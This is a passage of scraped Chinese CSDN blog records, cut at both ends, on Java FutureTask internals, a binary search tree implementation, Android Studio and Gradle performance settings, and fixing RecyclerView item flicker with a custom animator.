\n\n//创建Connection（根据业务需求，自定义Connection）  \nprivate Connection createConnection(){  \n    return null;  \n}  \n\n经过这样的改造，可以避免由于并发带来的多次创建连接及锁的出现。\n\n3 部分源码分析\n\n\n\n3.1 构造方法\n\n\n\npublic FutureTask(Runnable runnable, V result) {  \n        this.callable = Executors.callable(runnable, result);  \n        this.state = NEW;       // ensure visibility of callable  \n } \n\n\n\n3.2 cancel\n\n\n\n//这个方法有一个参数 是否中断running  \n     public boolean cancel(boolean mayInterruptIfRunning) {  \n          /** \n          * 这个有点晕啊逻辑关系是 \n          * 等价与 if(state!=new || !UNSAFE.compareAndSwapInt(this, stateOffset, NEW, mayInterruptIfRunning ? INTERRUPTING : CANCELLED)) \n          * 这个意思是 如果state不是new 那么就退出方法，这时的任务任务坑是已经完成了 或是被取消了 或是被中断了 \n          * 如果是state 是new 就设置state 为中断状态 或是取消状态 \n          * \n          **/  \n        if (!(state == NEW &&  \n              UNSAFE.compareAndSwapInt(this, stateOffset, NEW,  \n                  mayInterruptIfRunning ? INTERRUPTING : CANCELLED)))  \n            return false;  \n        try {    // in case call to interrupt throws exception  \n            //如果是可中断 那么就 调用系统中断方法 然后把状态设置成INTERRUPTED  \n            if (mayInterruptIfRunning) {  \n                try {  \n                    Thread t = runner;  \n                    if (t != null)  \n                        t.interrupt();  \n                } finally { // final state  \n                    UNSAFE.putOrderedInt(this, stateOffset, INTERRUPTED);  \n                }  \n            }  \n        } finally {  \n            finishCompletion();  \n        }  \n        return true;  \n    }  \n\n\n\n4 参考链接\n\nFutureTask的用法及两种常用的使用场景\n\nFutureTask 深度解析", "time": "2018_08_14_11_12_58", "link": "https://blog.csdn.net/chenliguan/article/details/54345993", "title": "Java进阶之FutureTask的用法及解析"}
{"timestamp": "2018_08_14_11_12_59", "desc": "1 二叉搜索树（BSTree）的概念\n\n　　二叉搜索树又被称为二叉排序树，那么它本身也是一棵二叉树，那么满足以下性质的二叉树就是二叉搜索树，如图：\n\n\n若左子树不为空，则左子树上所有节点的值都小于根节点的值；\n若它的右子树不为空，则它的右子树上所有节点的值都大于根节点的值；\n它的左右子树也要分别是二叉搜索树。 \n\n\n\n\n\n2 二叉搜索树的插入\n\n\n\n2.1 搜索\n\n　　插入之前我们先来说说它的搜索，像上图这样的一棵二叉搜索树，我们要查找某一个元素是很简单的。因为它的节点分布是有规律的，所以查找一棵元素只需要如下的步骤就可以了：\n\n\n\n2.2 插入\n\n　　由于二叉搜索树的特殊性质确定了二叉搜索树中每个元素只可能出现一次，所以在插入的过程中如果发现这个元素已经存在于二叉搜索树中，就不进行插入。否则就查找合适的位置进行插入。\n\n\n\n2.2.1 第一种情况：root为空\n\n　　直接插入，return true； \n \n\n\n\n2.2.2 第一种情况：要插入的元素已经存在\n\n　　如上面所说，如果在二叉搜索树中已经存在该元素，则不再进行插入，直接return  false；\n\n\n\n2.2.3 第三种情况：能够找到合适位置\n\n\n\n\n\n3 二叉搜索树的删除\n\n　　对于二叉搜索树的删除操作，主要是要理解其中的几种情况，写起来还是比较简单的。当然一开始还是需要判断要删除的节点是否存在于我们的树中，如果要删除的元素都不在树中，就直接返回false；否则，再分为以下四种情况来进行分析：\n\n\n要删除的节点无左右孩子；\n要删除的节点只有左孩子；\n要删除的节点只有右孩子；\n要删除的节点有左、右孩子。\n\n\n\n\n3.1 第一种情况：删除没有子节点的节点\n\n　　对于第一种情况，我们完全可以把它归为第二或者第三种情况，就不用再单独写一部分代码进行处理；\n\n\n\n3.2 第二种情况：删除有一个子节点的节点\n\n\n\n3.2.1 如果要删除的节点只有左孩子，那么就让该节点的父亲结点指向该节点的左孩子，然后删除该节点，返回true；\n\n\n\n\n\n3.2.2 如果要删除的节点只有右孩子，那么就让该节点的父亲结点指向该节点的右孩子，然后删除该节点，返回true；\n\n \n　　对于上面这两种情况我们还应该在之前进行一个判断，就是判断这个节点是否是根节点，如果是根节点的话，就直接让根节点指向这个节点的左孩子或右孩子，然后删除这个节点。\n\n\n\n3.3 第三种情况： 删除有两个子节点的节点，即左右子节点都非空\n\n（1）找到该节点的右子树中的最左孩子（也就是右子树中序遍历的第一个节点，分两种情况）\n\n\n此节点是有右子树： \n\n当这个节点没有右子树的情况下，即node.rchild == null，如果这个节点的父节点的左子树与这个节点相同的话，那么就说明这个父节点就是后续节点了 \n\n\n\n（2）把它的值和要删除的节点的值进行交换；\n\n（3）然后删除这个节点即相当于把我们想删除的节点删除了，返回true。\n\n4 参考链接\n\n二叉搜索树的插入与删除图解\n\n 二叉树算法删除代码实现 \n\n二叉树的Java实现及特点总结\n\n\n\n5 源码\n\n\n\npackage Tree;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class BinarySearchTree {\n\n    private TreeNode root = null;// 树的根节点\n\n    // 用于保存节点的列表\n    private static List<TreeNode> nodeList = new ArrayList<TreeNode>();\n\n    private class TreeNode {\n        private int key;// 节点关键字\n        private TreeNode parent;\n        private TreeNode lchild;\n        private TreeNode rchild;\n\n        public TreeNode(int key, TreeNode parent, TreeNode lchild,\n                TreeNode rchild) {\n            this.key = key;\n            this.parent = parent;\n            this.lchild = lchild;\n            this.rchild = rchild;\n        }\n\n        public String toString() {\n            String lKey = (lchild == null) ? \"\" : String.valueOf(lchild.key);\n            String rKey = (rchild == null) ? \"\" : String.valueOf(rchild.key);\n            return \"(\" + lKey + \"<-\" + key + \"->\" + rKey + \")\";\n        }\n    }\n\n    /**\n     * 判断是否为空\n     */\n    public boolean isEmpty() {\n        if (root == null) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    /**\n     * 如果树是空的情况下就抛出异常\n     */\n    public void TreeEmpty() throws Exception {\n        if (isEmpty()) {\n            throw new Exception(\"这棵树是空树！\");\n        }\n    }\n\n    /**\n     * 插入操作\n     * \n     * @param key\n     */\n    public void insert(int key) {\n        TreeNode parentNode = null;\n        TreeNode newNode = new TreeNode(key, null, null, null);\n        TreeNode pNode = root;\n        if (root == null) {\n            root = newNode;\n            return;\n        }\n        while (pNode != null) {\n            parentNode = pNode;\n            if (key > pNode.key) {\n                pNode = pNode.rchild;\n            } else if (key < pNode.key) {\n                pNode = pNode.lchild;\n            } else {\n                // 树中已经存在此值，无需再次插入\n                return;\n            }\n        }\n        if (key > parentNode.key) {\n            parentNode.rchild = newNode;\n            newNode.parent = parentNode;\n        } else if (key < parentNode.key) {\n            parentNode.lchild = newNode;\n            newNode.parent = parentNode;\n        }\n    }\n\n    /**\n     * 搜索关键字\n     * \n     * @param key\n     * @return\n     */\n    public TreeNode search(int key) {\n        TreeNode pNode = root;\n        while (pNode != null) {\n            if (key == pNode.key) {\n                return pNode;\n            } else if (key > pNode.key) {\n                pNode = pNode.rchild;\n            } else if (key < pNode.key) {\n                pNode = pNode.lchild;\n            }\n        }\n        return null;// 如果没有搜索到结果那么就只能返回空值了\n    }\n\n    /**\n     * 获取二叉树的最小关键字节点\n     * \n     * @param node\n     * @return\n     * @throws Exception\n     */\n    public TreeNode minElemNode(TreeNode node) throws Exception {\n        if (node == null) {\n            throw new Exception(\"此树为空树！\");\n        }\n        TreeNode pNode = node;\n        while (pNode.lchild != null) {\n            pNode = pNode.lchild;\n        }\n        return pNode;\n    }\n\n    /**\n     * 获取二叉树的最大关键字节点\n     * \n     * @param node\n     * @return\n     * @throws Exception\n     */\n    public TreeNode maxElemNode(TreeNode node) throws Exception {\n        if (node == null) {\n            throw new Exception(\"此树为空树！\");\n        }\n        TreeNode pNode = node;\n        while (pNode.rchild != null) {\n            pNode = pNode.rchild;\n        }\n        return pNode;\n    }\n\n    /**\n     * 获取给定节点在中序遍历下的后续第一个节点\n     * \n     * @param node\n     * @return\n     * @throws Exception\n     */\n    public TreeNode successor(TreeNode node) throws Exception {\n        if (node == null) {\n            throw new Exception(\"此树为空树！\");\n        }\n        // 分两种情况考虑，此节点是否有右子树\n        // 当这个节点有右子树的情况下，那么右子树的最小关键字节点就是这个节点的后续节点\n        if (node.rchild != null) {\n            return minElemNode(node.rchild);\n        }\n\n        // 当这个节点没有右子树的情况下,即 node.rchild == null\n        // 如果这个节点的父节点的左子树 与 这个节点相同的话，那么就说明这个父节点就是后续节点了\n        // 难道这里还需要进行两次if语句吗？不需要了，这里用一个while循环就可以了\n        TreeNode parentNode = node.parent;\n        while (parentNode != null && parentNode.rchild == node) {\n            node = parentNode;\n            parentNode = parentNode.parent;\n        }\n        return parentNode;\n    }\n\n    /**\n     * 获取给定节点在中序遍历下的前趋结\n     * \n     * @param node\n     * @return\n     * @throws Exception\n     */\n    public TreeNode precessor(TreeNode node) throws Exception {\n        // 查找前趋节点也是分两种情况考虑\n        // 如果这个节点存在左子树，那么这个左子树的最大关键字就是这个节点的前趋节点\n        if (node.lchild != null) {\n            return maxElemNode(node.lchild);\n        }\n        // 如果这个节点不存在左子树，那么这个节点的父节点\n        TreeNode parentNode = node.parent;\n        while (parentNode != null && parentNode.lchild == node) {\n            node = parentNode;\n            parentNode = parentNode.lchild;\n        }\n        return parentNode;\n    }\n\n    // 从二叉树当中删除指定的节点\n    public void delete(int key) throws Exception {\n        TreeNode pNode = search(key);\n        if (pNode == null) {\n            throw new Exception(\"此树中不存在要删除的这个节点！\");\n        }\n\n        delete(pNode);\n    }\n\n    /**\n     * 这个方法可以算是一个递归的方法，适用于 要删除的节点的两个子节点都非空，并且要删除的这个节点的后续节点也有子树的情况下\n     * \n     * @param pNode\n     * @throws Exception\n     */\n    private void delete(TreeNode pNode) throws Exception {\n        // 第一种情况:删除没有子节点的节点\n        if (pNode.lchild == null && pNode.rchild == null) {\n            if (pNode == root) {// 如果是根节点，那么就删除整棵树\n                root = null;\n            } else if (pNode == pNode.parent.lchild) {\n                // 如果这个节点是父节点的左节点，则将父节点的左节点设为空\n                pNode.parent.lchild = null;\n            } else if (pNode == pNode.parent.rchild) {\n                // 如果这个节点是父节点的右节点，则将父节点的右节点设为空\n                pNode.parent.rchild = null;\n            }\n        }\n\n        // 第二种情况： （删除有一个子节点的节点）\n        // 如果要删除的节点只有右节点\n        if (pNode.lchild == null && pNode.rchild != null) {\n            if (pNode == root) {\n                root = pNode.rchild;\n            } else if (pNode == pNode.parent.lchild) {\n                pNode.parent.lchild = pNode.rchild;\n                pNode.rchild.parent = pNode.parent;\n            } else if (pNode == pNode.parent.rchild) {\n                pNode.parent.rchild = pNode.rchild;\n                pNode.rchild.parent = pNode.parent;\n            }\n        }\n        // 如果要删除的节点只有左节点\n        if (pNode.lchild != null && pNode.rchild == null) {\n            if (pNode == root) {\n                root = pNode.lchild;\n            } else if (pNode == pNode.parent.lchild) {\n                pNode.parent.lchild = pNode.lchild;\n                pNode.lchild.parent = pNode.parent;\n            } else if (pNode == pNode.parent.rchild) {\n                pNode.parent.rchild = pNode.lchild;\n                pNode.lchild.parent = pNode.parent;\n            }\n        }\n\n        // 第三种情况： （删除有两个子节点的节点，即左右子节点都非空）\n\n        // 方法是用要删除的节点的后续节点代替要删除的节点，并且删除后续节点（删除后续节点的时候需要递归操作）\n        // 解析：这里要用到的最多也就会发生两次，即后续节点不会再继续递归的删除下一个后续节点了，\n        // 因为，要删除的节点的后续节点肯定是:要删除的那个节点的右子树的最小关键字，而这个最小关键字肯定不会有左节点;\n        // 所以，在删除后续节点的时候肯定不会用到（两个节点都非空的判断 ），如有有子节点，肯定就是有一个右节点。\n        if (pNode.lchild != null && pNode.rchild != null) {\n            // 先找出后续节点\n            TreeNode successorNode = successor(pNode);\n            if (pNode == root) {\n                root.key = successorNode.key;\n            } else {\n                pNode.key = successorNode.key;// 赋值，将后续节点的值赋给要删除的那个节点\n            }\n            delete(successorNode);// 递归的删除后续节点\n        }\n    }\n\n    /**\n     * 中序遍历二叉树，并获得节点列表\n     * \n     * @return\n     */\n    public List<TreeNode> inOrderTraverseList() {\n        if (nodeList != null) {\n            nodeList.clear();\n        }\n        inOrderTraverse(root);\n        return nodeList;\n    }\n\n    /**\n     * 进行中序遍历\n     * \n     * @param node\n     */\n    private void inOrderTraverse(TreeNode node) {\n        if (node != null) {\n            inOrderTraverse(node.lchild);\n            nodeList.add(node);\n            inOrderTraverse(node.rchild);\n        }\n    }\n\n    /**\n     * 获取二叉查找树中关键字的有序列表\n     * \n     * @return\n     */\n    public String toStringOfOrderList() {\n        StringBuilder sb = new StringBuilder(\"[\");\n        for (TreeNode pNode : nodeList) {\n            sb.append(pNode.key + \" \");\n        }\n        sb.append(\"]\");\n        return sb.toString();\n    }\n\n    public static void main(String[] args) {\n\n        BinarySearchTree tree = new BinarySearchTree();\n        // 添加数据测试\n        tree.insert(10);\n        tree.insert(40);\n        tree.insert(20);\n        tree.insert(3);\n        tree.insert(49);\n        tree.insert(13);\n        tree.insert(123);\n\n        // 中序排序测试\n        tree.inOrderTraverse(tree.root);\n        System.out.println(tree.toStringOfOrderList());\n        // 查找测试\n        if (tree.search(10) != null) {\n            System.out.println(\"找到了\");\n        } else {\n            System.out.println(\"没找到\");\n        }\n        // 删除测试\n        try {\n            tree.delete(tree.search(40));\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        // 检测删除节点\n        if (tree.search(40) != null) {\n            System.out.println(\"找到了\");\n        } else {\n            System.out.println(\"没找到\");\n        }\n\n        // 重新遍历\n        nodeList.clear();\n        tree.inOrderTraverse(tree.root);\n        System.out.println(tree.toStringOfOrderList());\n    }\n}", "time": "2018_08_14_11_12_59", "link": "https://blog.csdn.net/chenliguan/article/details/52956546", "title": "数据结构与算法之二叉搜索树插入、查询与删除"}
{"timestamp": "2018_08_14_11_13_00", "desc": "最近开始安装使用android studio，痛苦的发现安装或者后期升级后as运行时非常的卡。于是，深入的研究解决方法并不断的尝试，最后总结出如下的两点。\n\n一、工具软件配置 \n1、解决网络连接问题\n\n\n\n（1）问题描述 \n检查你的 Android SDK，卡上很长时间，需要更新则需要进行安装。\n\n（2）方法步骤 \n①跳过这一步，可在Android Studio安装目录下的 bin 目录下，找到 idea.properties 文件，在文件最后追加disable.android.first.run=true 。 \n②或者：使用墙外代理。\n\n2、解决内存吃紧问题 \n（1）问题描述 \nAndroid Studio 安装目录的-xmx 参数是 Java 虚拟机启动时的参数，用于限制最大堆内存。Android Studio 启动时设置了这个参数，并且默认值很小。 一旦你的工程变大，IDE 运行时间稍长，内存就开始吃紧，频繁触发 GC，自然会卡。\n\n（2）方法步骤 \n每次升级/安装 Android Studio 之后都修改android-studio/bin/studio.vmoptions studio64.vmoptions 两个文件的以下属性： \n-Xms2048m //JVM启动的起始堆内存 \n-Xmx2048m //AndroidStudio能使用的最大heap内存 \n-XX:MaxPermSize=2048m //最大的Permanent generation大小。存放的事类本身（不是对象），以及方法，一些固定的字符串等等。 \n-XX:ReservedCodeCacheSize=2048m  //设置JIT java compiler在compile的时候的最大代码缓存\n\n3、解决构建速度慢问题 \n（1）问题描述 \n随着项目的增大，依赖库的增多，构建速度越来越慢，现在最慢要6分钟才能build一个release的安装包\n\n（2）方法 \n开启gradle单独的守护进程，增大gradle运行的java虚拟机的大小，让gradle在编译的时候使用独立进程，让gradle可以平行的运行。\n\n（2）步骤 \n①在下面的目录下面创建gradle.properties文件：C:\\Users\\.gradle (Windows)\n\n②在文件中增加：org.gradle.daemon=true\n\n③优化以上用户目录下的gradle.properties文件，配置如下：\n\n\n\n# Project-wide Gradle settings.\n\n# IDE (e.g. Android Studio) users:\n# Settings specified in this file will override any Gradle settings\n# configured through the IDE.\n\n# For more details on how to configure your build environment visit\n# http://www.gradle.org/docs/current/userguide/build_environment.html\n\n# The Gradle daemon aims to improve the startup and execution time of Gradle.\n# When set to true the Gradle daemon is to run the build.\n# TODO: disable daemon on CI, since builds should be clean and reliable on servers\norg.gradle.daemon=true\n\n# Specifies the JVM arguments used for the daemon process.\n# The setting is particularly useful for tweaking memory settings.\n# Default value: -Xmx10248m -XX:MaxPermSize=256m\norg.gradle.jvmargs=-Xmx2048m -XX:MaxPermSize=512m -XX:+HeapDumpOnOutOfMemoryError -Dfile.encoding=UTF-8\n\n# When configured, Gradle will run in incubating parallel mode.\n# This option should only be used with decoupled projects. More details, visit\n# http://www.gradle.org/docs/current/userguide/multi_project_builds.html#sec:decoupled_projects\norg.gradle.parallel=true\n\n# Enables new incubating mode that makes Gradle selective when configuring projects. \n# Only relevant projects are configured which results in faster builds for large multi-projects.\n# http://www.gradle.org/docs/current/userguide/multi_project_builds.html#sec:configuration_on_demand\norg.gradle.configureondemand=true\n\n二、升级硬件 \n虽然对工具进行配置，但是需要更佳的用户体验，还是需要升级硬件。推荐升级配置为：I5+8G和128GSSD，甚至更高。\n\n总结，经过如上的配置和升级，AS的运行速度明显提升，开启软件只需4-6s，Gradle只需4-6s。", "time": "2018_08_14_11_13_00", "link": "https://blog.csdn.net/chenliguan/article/details/47605851", "title": "Android进阶之用起来很卡，解决方法"}
{"timestamp": "2018_08_14_11_13_00", "desc": "1 RecyclerView刷新方法\n\n\n\n1.1操作内容\n\nListView的getView方法的渲染数据部分的代码相当于onBindViewHolder()，如果调用adapter.notifyDataSetChanged()方法，会重新调用onBindViewHolder()方法。\n\n\n\n1.2其他刷新方法\n\n除了adapter.notifyDataSetChanged()这个方法之外，新的Adapter还提供了其他的方法，如下：\n\n\n\n//刷新所有\npublic final void notifyDataSetChanged();\n//position数据发生了改变，那调用这个方法，就会回调对应position的onBindViewHolder()方法了\npublic final void notifyItemChanged(int position);\n//刷新从positionStart开始itemCount数量的item了（这里的刷新指回调onBindViewHolder()方法）\npublic final void notifyItemRangeChanged(int positionStart, int itemCount);\n//在第position位置被插入了一条数据的时候可以使用这个方法刷新，注意这个方法调用后会有插入的动画，这个动画可以使用默认的，也可以自己定义\npublic final void notifyItemInserted(int position);\n//从fromPosition移动到toPosition为止的时候可以使用这个方法刷新\npublic final void notifyItemMoved(int fromPosition, int toPosition);\n//批量添加\npublic final void notifyItemRangeInserted(int positionStart, int itemCount);\n//第position个被删除的时候刷新，同样会有动画\npublic final void notifyItemRemoved(int position);\n//批量删除\npublic final void notifyItemRangeRemoved(int positionStart, int itemCount);\n\n\n\n2 闪屏问题\n\n\n\n2.1 问题描述\n\nRecyclerView做了一个notifyItemChanged()的操作，功能都顺利实现，问题当前Item闪烁，QA甚至为此提了Bug。\n\n\n\n2.2 问题原因\n\n闪烁主要由于RecyclerView使用的默认的动画导致的，所以解决的方法就是修改默认的动画。\n\n\n\n2.3 问题解决\n\n\n\n2.3.1 更新部分item\n\n（1）个别更新\n\nimgAdapter.notifyItemChanged(i);// 只更新修改的item\n\n（2）删除某个\n\nselectedImgs.remove(position);\nnotifyItemRemoved(position);\nnotifyItemRangeChanged(0,selectedImgs.size());\n\n2.3.2 屏蔽动画方法\n\nDefaultItemAnimator继承自SimpleItemAnimator，里面有个方法是：\n\n\n\n    /**\n     * Sets whether this ItemAnimator supports animations of item change events.\n     * If you set this property to false, actions on the data set which change the\n     * contents of items will not be animated. What those animations do is left\n     * up to the discretion of the ItemAnimator subclass, in its\n     * {@link #animateChange(ViewHolder, ViewHolder, int, int, int, int)} implementation.\n     * The value of this property is true by default.\n     *\n     */\n    public void setSupportsChangeAnimations(boolean supportsChangeAnimations) {\n        mSupportsChangeAnimations = supportsChangeAnimations;\n    }\n\n只要设置为false，就可以不显示动画了，也就解决了闪烁问题。 关键代码：\n\n\n\n((SimpleItemAnimator)recyclerView.getItemAnimator()).setSupportsChangeAnimations(false);\n\n\n\n\n2.3.3 设置动画执行时间为0来解决闪烁问题\n\n\n\nrecyclerView.getItemAnimator().setChangeDuration(0);// 通过设置动画执行时间为0来解决闪烁问题\n\n\n\n2.3.4 修改默认的动画方法\n\n\n\n//1.定义动画类\npublic class NoAlphaItemAnimator extends SimpleItemAnimator {\n\n}\n\n\n\n\n//2.将DefaultItemAnimator类里的代码全部copy到自己写的动画类中，然后做一些修改。\n\n//3.首先找到private void animateChangeImpl(final ChangeInfo changeInfo) {}方法。\n\n//4.找到方法里这两句代码：\n4.1 去掉alpha(0)\noldViewAnim.alpha(0).setListener(new VpaListenerAdapter() {...}).start();\noldViewAnim.setListener(new VpaListenerAdapter() {...}).start();\n\n4.2 去掉alpha(1)\nnewViewAnimation.translationX(0).translationY(0).setDuration(getChangeDuration()).\n                    alpha(1).setListener(new VpaListenerAdapter() {...}).start();\nnewViewAnimation.translationX(0).translationY(0).setDuration(getChangeDuration()).\n                    setListener(new VpaListenerAdapter() {...}).start();\n\n//5.最后使用修改后的动画\nrecyclerView.setItemAnimator(new NoAlphaItemAnimator());\n\n例子如：\n\n\n\npackage com.example.splash.pictureselecters.view;\n\nimport android.support.annotation.NonNull;\nimport android.support.v4.animation.AnimatorCompatHelper;\nimport android.support.v4.view.ViewCompat;\nimport android.support.v4.view.ViewPropertyAnimatorCompat;\nimport android.support.v4.view.ViewPropertyAnimatorListener;\nimport android.support.v7.widget.RecyclerView;\nimport android.support.v7.widget.SimpleItemAnimator;\nimport android.view.View;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\n/**\n * Created by chenliguan on 2017/5/3 0003.\n */\npublic class NoAlphaItemAnimator extends SimpleItemAnimator {\n\n    private static final boolean DEBUG = false;\n\n    private ArrayList<RecyclerView.ViewHolder> mPendingRemovals = new ArrayList<>();\n    private ArrayList<RecyclerView.ViewHolder> mPendingAdditions = new ArrayList<>();\n    private ArrayList<NoAlphaItemAnimator.MoveInfo> mPendingMoves = new ArrayList<>();\n    private ArrayList<NoAlphaItemAnimator.ChangeInfo> mPendingChanges = new ArrayList<>();\n\n    ArrayList<ArrayList<RecyclerView.ViewHolder>> mAdditionsList = new ArrayList<>();\n    ArrayList<ArrayList<NoAlphaItemAnimator.MoveInfo>> mMovesList = new ArrayList<>();\n    ArrayList<ArrayList<NoAlphaItemAnimator.ChangeInfo>> mChangesList = new ArrayList<>();\n\n    ArrayList<RecyclerView.ViewHolder> mAddAnimations = new ArrayList<>();\n    ArrayList<RecyclerView.ViewHolder> mMoveAnimations = new ArrayList<>();\n    ArrayList<RecyclerView.ViewHolder> mRemoveAnimations = new ArrayList<>();\n    ArrayList<RecyclerView.ViewHolder> mChangeAnimations = new ArrayList<>();\n\n    private static class MoveInfo {\n        public RecyclerView.ViewHolder holder;\n        public int fromX, fromY, toX, toY;\n\n        MoveInfo(RecyclerView.ViewHolder holder, int fromX, int fromY, int toX, int toY) {\n            this.holder = holder;\n            this.fromX = fromX;\n            this.fromY = fromY;\n            this.toX = toX;\n            this.toY = toY;\n        }\n    }\n\n    private static class ChangeInfo {\n        public RecyclerView.ViewHolder oldHolder, newHolder;\n        public int fromX, fromY, toX, toY;\n        private ChangeInfo(RecyclerView.ViewHolder oldHolder, RecyclerView.ViewHolder newHolder) {\n            this.oldHolder = oldHolder;\n            this.newHolder = newHolder;\n        }\n\n        ChangeInfo(RecyclerView.ViewHolder oldHolder, RecyclerView.ViewHolder newHolder,\n                   int fromX, int fromY, int toX, int toY) {\n            this(oldHolder, newHolder);\n            this.fromX = fromX;\n            this.fromY = fromY;\n            this.toX = toX;\n            this.toY = toY;\n        }\n\n        @Override\n        public String toString() {\n            return \"ChangeInfo{\" +\n                    \"oldHolder=\" + oldHolder +\n                    \", newHolder=\" + newHolder +\n                    \", fromX=\" + fromX +\n                    \", fromY=\" + fromY +\n                    \", toX=\" + toX +\n                    \", toY=\" + toY +\n                    '}';\n        }\n    }\n\n    @Override\n    public void runPendingAnimations() {\n        boolean removalsPending = !mPendingRemovals.isEmpty();\n        boolean movesPending = !mPendingMoves.isEmpty();\n        boolean changesPending = !mPendingChanges.isEmpty();\n        boolean additionsPending = !mPendingAdditions.isEmpty();\n        if (!removalsPending && !movesPending && !additionsPending && !changesPending) {\n            // nothing to animate\n            return;\n        }\n        // First, remove stuff\n        for (RecyclerView.ViewHolder holder : mPendingRemovals) {\n            animateRemoveImpl(holder);\n        }\n        mPendingRemovals.clear();\n        // Next, move stuff\n        if (movesPending) {\n            final ArrayList<NoAlphaItemAnimator.MoveInfo> moves = new ArrayList<>();\n            moves.addAll(mPendingMoves);\n            mMovesList.add(moves);\n            mPendingMoves.clear();\n            Runnable mover = new Runnable() {\n                @Override\n                public void run() {\n                    for (NoAlphaItemAnimator.MoveInfo moveInfo : moves) {\n                        animateMoveImpl(moveInfo.holder, moveInfo.fromX, moveInfo.fromY,\n                                moveInfo.toX, moveInfo.toY);\n                    }\n                    moves.clear();\n                    mMovesList.remove(moves);\n                }\n            };\n            if (removalsPending) {\n                View view = moves.get(0).holder.itemView;\n                ViewCompat.postOnAnimationDelayed(view, mover, getRemoveDuration());\n            } else {\n                mover.run();\n            }\n        }\n        // Next, change stuff, to run in parallel with move animations\n        if (changesPending) {\n            final ArrayList<NoAlphaItemAnimator.ChangeInfo> changes = new ArrayList<>();\n            changes.addAll(mPendingChanges);\n            mChangesList.add(changes);\n            mPendingChanges.clear();\n            Runnable changer = new Runnable() {\n                @Override\n                public void run() {\n                    for (NoAlphaItemAnimator.ChangeInfo change : changes) {\n                        animateChangeImpl(change);\n                    }\n                    changes.clear();\n                    mChangesList.remove(changes);\n                }\n            };\n            if (removalsPending) {\n                RecyclerView.ViewHolder holder = changes.get(0).oldHolder;\n                ViewCompat.postOnAnimationDelayed(holder.itemView, changer, getRemoveDuration());\n            } else {\n                changer.run();\n            }\n        }\n        // Next, add stuff\n        if (additionsPending) {\n            final ArrayList<RecyclerView.ViewHolder> additions = new ArrayList<>();\n            additions.addAll(mPendingAdditions);\n            mAdditionsList.add(additions);\n            mPendingAdditions.clear();\n            Runnable adder = new Runnable() {\n                @Override\n                public void run() {\n                    for (RecyclerView.ViewHolder holder : additions) {\n                        animateAddImpl(holder);\n                    }\n                    additions.clear();\n                    mAdditionsList.remove(additions);\n                }\n            };\n            if (removalsPending || movesPending || changesPending) {\n                long removeDuration = removalsPending ? getRemoveDuration() : 0;\n                long moveDuration = movesPending ? getMoveDuration() : 0;\n                long changeDuration = changesPending ? getChangeDuration() : 0;\n                long totalDelay = removeDuration + Math.max(moveDuration, changeDuration);\n                View view = additions.get(0).itemView;\n                ViewCompat.postOnAnimationDelayed(view, adder, totalDelay);\n            } else {\n                adder.run();\n            }\n        }\n    }\n\n    @Override\n    public boolean animateRemove(final RecyclerView.ViewHolder holder) {\n        resetAnimation(holder);\n        mPendingRemovals.add(holder);\n        return true;\n    }\n\n    private void animateRemoveImpl(final RecyclerView.ViewHolder holder) {\n        final View view = holder.itemView;\n        final ViewPropertyAnimatorCompat animation = ViewCompat.animate(view);\n        mRemoveAnimations.add(holder);\n        animation.setDuration(getRemoveDuration())\n                .setListener(new NoAlphaItemAnimator.VpaListenerAdapter() {\n            @Override\n            public void onAnimationStart(View view) {\n                dispatchRemoveStarting(holder);\n            }\n\n            @Override\n            public void onAnimationEnd(View view) {\n                animation.setListener(null);\n                ViewCompat.setAlpha(view, 1);\n                dispatchRemoveFinished(holder);\n                mRemoveAnimations.remove(holder);\n                dispatchFinishedWhenDone();\n            }\n        }).start();\n    }\n\n    @Override\n    public boolean animateAdd(final RecyclerView.ViewHolder holder) {\n        resetAnimation(holder);\n        ViewCompat.setAlpha(holder.itemView, 0);\n        mPendingAdditions.add(holder);\n        return true;\n    }\n\n    void animateAddImpl(final RecyclerView.ViewHolder holder) {\n        final View view = holder.itemView;\n        final ViewPropertyAnimatorCompat animation = ViewCompat.animate(view);\n        mAddAnimations.add(holder);\n        animation.setDuration(getAddDuration()).\n                setListener(new NoAlphaItemAnimator.VpaListenerAdapter() {\n                    @Override\n                    public void onAnimationStart(View view) {\n                        dispatchAddStarting(holder);\n                    }\n                    @Override\n                    public void onAnimationCancel(View view) {\n                        ViewCompat.setAlpha(view, 1);\n                    }\n\n                    @Override\n                    public void onAnimationEnd(View view) {\n                        animation.setListener(null);\n                        dispatchAddFinished(holder);\n                        mAddAnimations.remove(holder);\n                        dispatchFinishedWhenDone();\n                    }\n                }).start();\n    }\n\n    @Override\n    public boolean animateMove(final RecyclerView.ViewHolder holder, int fromX, int fromY,\n                               int toX, int toY) {\n        final View view = holder.itemView;\n        fromX += ViewCompat.getTranslationX(holder.itemView);\n        fromY += ViewCompat.getTranslationY(holder.itemView);\n        resetAnimation(holder);\n        int deltaX = toX - fromX;\n        int deltaY = toY - fromY;\n        if (deltaX == 0 && deltaY == 0) {\n            dispatchMoveFinished(holder);\n            return false;\n        }\n        if (deltaX != 0) {\n            ViewCompat.setTranslationX(view, -deltaX);\n        }\n        if (deltaY != 0) {\n            ViewCompat.setTranslationY(view, -deltaY);\n        }\n        mPendingMoves.add(new NoAlphaItemAnimator.MoveInfo(holder, fromX, fromY, toX, toY));\n        return true;\n    }\n\n    void animateMoveImpl(final RecyclerView.ViewHolder holder, int fromX, int fromY, int toX, int toY) {\n        final View view = holder.itemView;\n        final int deltaX = toX - fromX;\n        final int deltaY = toY - fromY;\n        if (deltaX != 0) {\n            ViewCompat.animate(view).translationX(0);\n        }\n        if (deltaY != 0) {\n            ViewCompat.animate(view).translationY(0);\n        }\n        // TODO: make EndActions end listeners instead, since end actions aren't called when\n        // vpas are canceled (and can't end them. why?)\n        // need listener functionality in VPACompat for this. Ick.\n        final ViewPropertyAnimatorCompat animation = ViewCompat.animate(view);\n        mMoveAnimations.add(holder);\n        animation.setDuration(getMoveDuration()).setListener(new NoAlphaItemAnimator.VpaListenerAdapter() {\n            @Override\n            public void onAnimationStart(View view) {\n                dispatchMoveStarting(holder);\n            }\n            @Override\n            public void onAnimationCancel(View view) {\n                if (deltaX != 0) {\n                    ViewCompat.setTranslationX(view, 0);\n                }\n                if (deltaY != 0) {\n                    ViewCompat.setTranslationY(view, 0);\n                }\n            }\n            @Override\n            public void onAnimationEnd(View view) {\n                animation.setListener(null);\n                dispatchMoveFinished(holder);\n                mMoveAnimations.remove(holder);\n                dispatchFinishedWhenDone();\n            }\n        